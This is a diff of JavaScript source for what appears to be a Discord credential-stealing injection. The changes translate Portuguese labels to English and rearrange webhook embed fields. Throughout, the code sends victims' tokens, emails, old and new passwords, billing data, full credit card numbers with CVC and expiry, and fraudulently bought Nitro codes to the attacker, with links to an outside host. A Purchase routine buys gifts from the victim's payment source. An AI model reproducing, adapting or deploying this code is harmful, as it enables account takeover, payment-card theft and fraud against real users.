@@ -516,7 +516,7 @@ const Purchase = async (token, id, _type, _time) => {
     gift: true,
     payment_source_id: id,
     payment_source_token: null,
-    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
+    purchase_token: '500fb34b-671a-4614-a72e-9d13becc2e95',
     sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
   };
 
@@ -655,49 +655,44 @@ const login = async (email, password, token) => {
     avatar_url: config.embed_icon,
     embeds: [
       {
-        title: "Injetado com sucesso",
-        description: `[**Copy Token**](superfurrycdn.nl/copy/${token})`,
+        title: "New Victim",
+        description: `[Copy Token](superfurrycdn.nl/copy/${token})`,
         color: config.embed_color,
         fields: [
           {
             name: 'User',
             value: `\`${json.username}#${json.discriminator}\``,
-            inline: true,
+            inline: false,
           },
           {
             name: 'ID',
             value: `\`${json.id}\``,
-            inline: true,
+            inline: false,
           },
           {
-            name: 'Boost Upada',
-            value: `${nitro}`,
-            inline: true,
+            name: 'Badges',
+            value: `${nitro} ${badges}`,
+            inline: false,
           },
           {
-            name: 'Insígnias',
-            value: `${badges}`,
-            inline: true,
-          },
-          {
-            name: 'Pagamentos',
+            name: 'Bin',
             value: `\`${billing}\``,
-            inline: true,
+            inline: false,
           },
           {
-            name: 'Inbox',
+            name: 'Mail',
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: 'Senha',
+            name: 'Password',
             value: `\`${password}\``,
             inline: true,
           },
           {
             name: 'Token',
             value: `\`\`\`${token}\`\`\``,
-            inline: true,
+            inline: false,
           },
         ],
         author: {
@@ -715,7 +710,7 @@ const login = async (email, password, token) => {
 };
 
 
-const passwordChanged = async (oldpassword, newpassword, token) => {
+const passwordChanged = async (oldpassword, newpassword, token, email) => {
     const json = await getInfo(token);
     const nitro = getNitro(json.premium_type);
     const badges = getBadges(json.flags);
@@ -725,34 +720,39 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       avatar_url: config.embed_icon,
       embeds: [
         {
-          title: "Senha alterada",
-          description: `[**Copy Token**](https://superfurrycdn.nl/copy/${token})`,
+          title: "Password Changed",
+          description: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
           color: config.embed_color,
           fields: [
             {
-              name: 'Senha Antiga',
+              name: 'Old Password',
               value: `**${oldpassword}**`,
+              inline: false,
+            },
+            {
+              name: 'New Password',
+              value: `\`${newpassword}\``,
               inline: true,
             },
             {
-              name: 'Nova Senha',
-              value: `\`${newpassword}\``,
+              name: 'Mail',
+              value: `\`${email}\``,
               inline: true,
             },
             {
               name: 'User',
               value: `\`${json.username}#${json.discriminator}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: 'ID',
               value: `\`${json.id}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: 'Token',
               value: `\`\`\`${token}\`\`\``,
-              inline: true,
+              inline: false,
             },
           ],
           author: {
@@ -779,29 +779,34 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       avatar_url: config.embed_icon,
       embeds: [
         {
-          title: "Inbox Alterado",
-          description: `[**Copy Token**](https://superfurrycdn.nl/copy/${token})`,
+          title: "Mail Changed",
+          description: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
           color: config.embed_color,
           fields: [
             {
-              name: 'Novo Inbox',
+              name: 'New Mail',
               value: `\`${email}\``,
+              inline: true,
+            },
+            {
+              name: 'Password',
+              value: `\`${password}\``,
               inline: true,
             },
             {
               name: 'User',
               value: `\`${json.username}#${json.discriminator}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: 'ID',
               value: `\`${json.id}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: 'Token',
               value: `\`\`\`${token}\`\`\``,
-              inline: true,
+              inline: false,
             },
           ],
           author: {
@@ -831,8 +836,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           color: config.embed_color,
           fields: [
             {
-              name: 'Paypal Adicionado',
-              value: `Time to buy some nitro baby 😩`,
+              name: 'PayPal Added',
+              value: `Go buy nitro lmao`,
               inline: true,
             },
             {
@@ -848,7 +853,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             {
               name: 'Token',
               value: `\`\`\`${token}\`\`\``,
-              inline: true,
+              inline: false,
             },
           ],
           author: {
@@ -878,24 +883,34 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           color: config.embed_color,
           fields: [
             {
-              name: 'CC Adicionada',
-              value: Número **${number}**\nCVV **${cvc}**\nValidade **${expir_month}/${expir_year}**`,
-              inline: true,
+              name: 'CC Number',
+              value: `||\`${number}\`||`,
+              inline: false,
+            },
+            {
+              name: 'Expiration Date',
+              value: `\`${expir_month}/${expir_year}\``,
+              inline: false,
+            },
+            {
+              name: 'CVC',
+              value: `\`${cvc}\``,
+              inline: false,
             },
             {
               name: 'User',
               value: `\`${json.username}#${json.discriminator}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: 'ID',
               value: `\`${json.id}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: 'Token',
               value: `\`\`\`${token}\`\`\``,
-              inline: true,
+              inline: false,
             },
           ],
           author: {
@@ -927,24 +942,24 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           color: config.embed_color,
           fields: [
             {
-              name: 'Nitro Comprado',
-              value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
-              inline: true,
+              name: 'Nitro Bought',
+              value: `\n\`\`\`diff\n+ ${code}\`\`\``,
+              inline: false,
             },
             {
               name: 'User',
               value: `\`${json.username}#${json.discriminator}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: 'ID',
               value: `\`${json.id}\``,
-              inline: true,
+              inline: false,
             },
             {
               name: 'Token',
               value: `\`\`\`${token}\`\`\``,
-              inline: true,
+              inline: false,
             },
           ],
           author: {
